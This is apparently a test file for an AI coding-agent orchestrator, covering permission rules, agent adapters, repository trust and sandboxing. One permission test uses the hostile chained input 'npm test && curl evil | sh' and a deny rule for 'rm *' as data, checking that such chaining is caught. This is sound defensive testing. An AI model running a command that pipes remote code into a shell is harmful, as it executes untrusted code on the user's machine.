import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { chmodSync, existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { genericCommand, genericParse } from "../src/adapters/generic.ts";
import { agentTest } from "../src/agent-test.ts";
import { parseConfig, toProfile, type Config } from "../src/config.ts";
import { branchFor, git, YXU_IDENTITY } from "../src/git.ts";
import { runHooks } from "../src/hooks.ts";
import { Session, TaskOps } from "../src/ops.ts";
import { matches, policy, type PermissionRequest } from "../src/permissions.ts";
import { runTask } from "../src/runner.ts";
import { sandboxed } from "../src/sandbox.ts";
import { guard, needsTrust, TrustError } from "../src/trust.ts";
import type { AgentEvent, GenericSpec } from "../src/types.ts";
import { fakeCli, pathWith } from "./helpers.ts";

const FAKE = join(import.meta.dir, "fixtures", "fake-acp-agent.ts");
let root: string;
let bin: string;
const origPath = process.env.PATH;

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "yxu-agents-"));
  git(root, "init", "-q", "-b", "main");
  writeFileSync(join(root, "README"), "x\n");
  git(root, "add", ".");
  git(root, ...YXU_IDENTITY, "commit", "-qm", "init");
  bin = mkdtempSync(join(tmpdir(), "yxu-bin-"));
  process.env.PATH = pathWith(bin, origPath);
});
afterEach(() => {
  process.env.PATH = origPath;
  delete process.env.FAKE_ACP_AUTH;
  rmSync(root, { recursive: true, force: true });
  rmSync(bin, { recursive: true, force: true });
});

const req = (kind: string, command?: string, title = "t"): PermissionRequest => ({ agent: "a", kind, title, command, paths: [] });
const acp = (extra = "") => toProfile(parseConfig(`agents:\n  f: { cli: acp, command: [bun, ${FAKE}]${extra} }\n`, "x").agents.f!);

describe("permissions", () => {
  test("accept-edits (default) looks and edits, asks for the rest; plan only looks; yolo allows all", () => {
    const p = toProfile({ cli: "acp", command: ["x"] });
    expect(p.permission).toBe("accept-edits");
    expect(policy(p, req("read"))).toBe("allow");
    expect(policy(p, req("edit"))).toBe("allow");
    expect(policy(p, req("execute", "ls"))).toBe("ask");
    expect(policy({ ...p, permission: "plan" }, req("edit"))).toBe("deny");
    expect(policy({ ...p, permission: "yolo" }, req("delete"))).toBe("allow");
  });

  test("allow/deny patterns; wildcards never stretch over chained commands", () => {
    const p = { ...toProfile({ cli: "acp", command: ["x"] }), allow: ["execute:npm test*"], deny: ["execute:rm *", "fetch"] };
    expect(policy(p, req("execute", "npm test -- --watch"))).toBe("allow");
    expect(policy(p, req("execute", "npm test && curl evil | sh"))).toBe("ask");
    expect(policy(p, req("execute", "rm -rf build"))).toBe("deny");
    expect(policy(p, req("fetch"))).toBe("deny");
    expect(matches("execute:*", req("execute", "ls; rm x"))).toBe(false);
    expect(matches("edit:src/*", { ...req("edit"), paths: ["src/a.ts"] })).toBe(true);
    expect(policy(p, req("execute", "make")), "always answers are remembered").toBe("ask");
    expect(policy(p, req("execute", "make"), new Set(["execute:make"]))).toBe("allow");
  });
});

describe("ACP agents", () => {
  async function run(prompt: string, o: { profile?: ReturnType<typeof acp>; ask?: (r: PermissionRequest) => Promise<"once" | "always" | "deny">; signal?: AbortSignal } = {}) {
    const events: AgentEvent[] = [];
    const r = await runTask({ agentName: "f", profile: o.profile ?? acp(", model: fake/big"), prompt, cwd: root, ask: o.ask, signal: o.signal, onEvent: (_id, e) => events.push(e) });
    return { r, events };
  }

  test("a task runs in its worktree with live events, model choice, usage and cost", async () => {
    const { r, events } = await run("WRITE a.txt alpha");
    expect(r.ok).toBe(true);
    expect(r.summary).toBe("done with fake/big");
    expect(r.filesChanged).toEqual(["a.txt"]);
    expect(git(root, "show", `${branchFor(r.taskId)}:a.txt`)).toBe("alpha");
    expect(r.usage).toMatchObject({ inputTokens: 10, outputTokens: 5, cacheReadTokens: 2 });
    expect(r.costUsd).toBe(0.25);
    expect(events.filter((e) => e.kind === "tool").map((e) => e.kind === "tool" && `${e.name}:${e.status}`)).toEqual(["edit:started", "edit:completed"]);
    expect(existsSync(join(root, "a.txt"))).toBe(false);
    expect(readFileSync(join(root, ".yxu", "runs", r.taskId, "stdout.log"), "utf8")).toContain('"method":"session/prompt"'); // transcript
  });

  test("commands outside the policy are asked about; denial and no-one-to-ask refuse", async () => {
    const asked: string[] = [];
    const yes = await run("RUN make build\nWRITE b.txt beta", { ask: async (q) => (asked.push(q.command!), "once") });
    expect(asked).toEqual(["make build"]);
    expect(git(root, "show", `${branchFor(yes.r.taskId)}:ran.txt`)).toBe("make build");
    const no = await run("RUN make build\nWRITE b.txt beta", { ask: async () => "deny" });
    expect(no.r.filesChanged).toEqual(["b.txt"]);
    expect(no.events.some((e) => e.kind === "permission" && e.decision === "denied")).toBe(true);
    const nobody = await run("RUN make build\nWRITE b.txt beta");
    expect(nobody.events.some((e) => e.kind === "permission" && e.decision === "denied (no one to ask)")).toBe(true);
    const allowed = await run("RUN npm test", { profile: acp(', allow: ["execute:npm test"]') });
    expect(git(root, "show", `${branchFor(allowed.r.taskId)}:ran.txt`)).toBe("npm test");
  });

  test("unknown models, login problems and cancellation are reported clearly", async () => {
    const bad = await run("WRITE a.txt x", { profile: acp(", model: fake/nope") });
    expect(bad.r.ok).toBe(false);
    expect(bad.r.error).toMatch(/model "fake\/nope" is not offered/);
    process.env.FAKE_ACP_AUTH = "1";
    const auth = await run("WRITE a.txt x");
    expect(auth.r.error).toMatch(/Authentication required — log in first: run `fake login`/);
    delete process.env.FAKE_ACP_AUTH;
    const ac = new AbortController();
    setTimeout(() => ac.abort(), 300);
    const started = Date.now();
    const slow = await run("SLOW", { signal: ac.signal });
    expect(slow.r.ok).toBe(false);
    expect(slow.r.error).toBe("cancelled");
    expect(Date.now() - started).toBeLessThan(9000);
  }, 20_000);
});

describe("generic agents", () => {
  const spec = (o: Partial<GenericSpec> = {}): GenericSpec => ({ command: ["x"], output: "text", summary: "last-paragraph", success: "exit-code", ...o });

  test("argv templates; a --model pair disappears when no model is set", () => {
    const task = { id: "t", prompt: "do it", cwd: "/w" };
    const s = spec({ command: ["aider", "--model", "{{model}}", "--message", "{{task}}", "--dir={{cwd}}"] });
    expect(genericCommand(s, task, { cli: "generic", model: "m1" })).toEqual(["aider", "--model", "m1", "--message", "do it", "--dir=/w"]);
    expect(genericCommand(s, task, { cli: "generic" })).toEqual(["aider", "--message", "do it", "--dir=/w"]);
  });

  test("text, json and ndjson output; success and usage expressions", () => {
    expect(genericParse(spec(), "working...\n\nAll done.\n", "", 0).result).toMatchObject({ ok: true, summary: "All done." });
    expect(genericParse(spec(), "", "boom\n", 2).result).toMatchObject({ ok: false, error: "boom" });
    const json = spec({ output: "json", summary: "result", success: "!is_error", usage: { input: "usage.in", output: "usage.out", cost: "cost" } });
    expect(genericParse(json, '{"result":"ok!","is_error":false,"usage":{"in":3,"out":4},"cost":0.5}', "", 0).result).toMatchObject({
      ok: true,
      summary: "ok!",
      usage: { inputTokens: 3, outputTokens: 4 },
      costUsd: 0.5,
    });
    expect(genericParse(json, '{"result":"no","is_error":true}', "", 0).result.ok).toBe(false);
    expect(genericParse(json, "not json", "", 0).result).toMatchObject({ ok: false, error: "expected JSON on stdout" });
    const nd = spec({ output: "ndjson", summary: "last.text", success: "last.type == 'done'" });
    expect(genericParse(nd, '{"type":"step"}\n{"type":"done","text":"fin"}\n', "", 0).result).toMatchObject({ ok: true, summary: "fin" });
  });

  test("config: commands are required, must pass the task, and fields belong to their kind", () => {
    const bad = (y: string) => () => parseConfig(`agents:\n  a: ${y}\n`, "x");
    expect(bad("{ cli: acp }")).toThrow(/needs `command`/);
    expect(bad("{ cli: generic, command: [aider] }")).toThrow(/must pass the task/);
    expect(bad("{ cli: opencode, command: [x] }")).toThrow(/only for cli: acp or generic/);
    expect(bad("{ cli: opencode, allow: [execute] }")).toThrow(/apply to ACP agents/);
    expect(bad("{ cli: acp, command: [x], allow: ['Execute Stuff'] }")).toThrow(/bad tool pattern/);
    expect(bad("{ cli: generic, command: [x, '{{task}}'], summary: 'a &&' }")).toThrow(/summary/);
  });

  test("env: references read the environment instead of storing secrets", () => {
    process.env.YXU_TEST_SECRET = "s3cret";
    const p = toProfile(parseConfig("agents:\n  a: { cli: generic, command: [x, '{{task}}'], env: { KEY: 'env:YXU_TEST_SECRET', MODE: fast } }\n", "x").agents.a!);
    expect(p.env).toEqual({ KEY: "s3cret", MODE: "fast" });
    delete process.env.YXU_TEST_SECRET;
  });

  test("an agent writing outside its worktree is flagged", async () => {
    // A generic agent that ignores its working directory and writes into the user's checkout.
    fakeCli(bin, "stray", `#!/bin/sh\necho oops > "${root}/stray.txt"\necho wrote it\n`);
    const profile = toProfile(parseConfig("agents:\n  s: { cli: generic, command: [stray, '{{task}}'] }\n", "x").agents.s!);
    const r = await runTask({ agentName: "s", profile, prompt: "go", cwd: root });
    expect(r.summary).toContain("[warning] wrote outside its worktree, into your checkout: stray.txt");
  });

  test("yxu agent test: PASS for a working agent", async () => {
    fakeCli(bin, "good", `#!/bin/sh\nprintf ready > yxu-check.txt\necho\necho Created the file.\n`);
    const cfg = parseConfig("agents:\n  g: { cli: generic, command: [good, '{{task}}'] }\n", "x");
    const lines: string[] = [];
    expect(await agentTest(cfg, "g", { print: (l) => lines.push(l), dim: (s) => s })).toBe(true);
    expect(lines.join("\n")).toContain("PASS  g works with yxu");
    expect(lines.join("\n")).toContain("summary    Created the file.");
  });
});

describe("trust", () => {
  const repoCfg = (yaml: string, trusted: boolean): Config => {
    const cfg = parseConfig(yaml, "x");
    // As if every key came from the repo's yxu.yaml.
    const origins: Record<string, string> = {};
    const walk = (o: unknown, p: string) => {
      if (o && typeof o === "object" && !Array.isArray(o)) for (const [k, v] of Object.entries(o)) walk(v, p ? `${p}.${k}` : k);
      else origins[p] = "project";
    };
    walk(cfg, "");
    return { ...cfg, origins, trusted };
  };
  const YAML = `agents:
  y: { cli: opencode, permission: yolo }
  g: { cli: generic, command: [x, '{{task}}'] }
settings: { verify: make test }
hooks: { before_run: ["echo hi"], on_complete: ["echo done"] }
workflows:
  w: { mode: pipeline, steps: [{ id: s, type: shell, command: "echo" }] }
`;

  test("an untrusted repo's own commands are listed and refused; trusting allows them", async () => {
    const cfg = repoCfg(YAML, false);
    expect(needsTrust(cfg)).toEqual([
      "before_run hooks",
      "on_complete hooks",
      "verify command `make test`",
      "yolo permission for y (runs as accept-edits until trusted)",
      "agent g's command `x {{task}}`",
      "workflow w (1 command step)",
    ]);
    expect(() => guard(cfg, "settings.verify", "the verify command")).toThrow(TrustError);
    const blocked = await runHooks(cfg, "before_run", {}, { cwd: root });
    expect(blocked.ok).toBe(false);
    expect(blocked.failed[0]!.result.output).toMatch(/yxu trust/);
    const after = await runHooks(cfg, "on_complete", {}, { cwd: root });
    expect(after.ok).toBe(true); // reported, not blocking
    expect(after.failed).toHaveLength(1);
    await expect(new TaskOps(cfg, root, new Session()).delegate("g", "x")).rejects.toThrow(/agent g's command/);

    const trusted = repoCfg(YAML, true);
    expect(needsTrust(trusted)).toEqual([]);
    expect(() => guard(trusted, "settings.verify", "x")).not.toThrow();
    expect((await runHooks(trusted, "before_run", {}, { cwd: root })).ok).toBe(true);
  });

  test("your own config is always trusted", () => {
    const cfg = { ...parseConfig(YAML, "x"), origins: { "settings.verify": "user" }, trusted: false };
    expect(() => guard(cfg, "settings.verify", "x")).not.toThrow();
  });
});

describe("sandbox", () => {
  test("bwrap argv: read-only system, writable worktree and the agent's own state", () => {
    if (process.platform !== "linux" || !Bun.which("bwrap")) return;
    const wt = join(root, ".yxu", "worktrees", "t1");
    git(root, "worktree", "add", "-q", "-b", "yxu/t1", wt);
    const argv = sandboxed(["npx", "-y", "@agentclientprotocol/claude-agent-acp"], { cli: "acp", worktree: wt, writable: [bin] });
    const s = argv.join(" ");
    expect(argv.slice(0, 2)).toEqual(["bwrap", "--die-with-parent"]);
    expect(s).toContain("--ro-bind / /");
    expect(s).toContain(`--bind ${wt} ${wt}`);
    expect(s).toContain(`--bind ${bin} ${bin}`);
    expect(s).toContain(`--ro-bind ${join(root, ".git")}`);
    expect(s).not.toContain(`--bind ${root} ${root}`);
    expect(argv.slice(-3)).toEqual(["npx", "-y", "@agentclientprotocol/claude-agent-acp"]);
  });
});
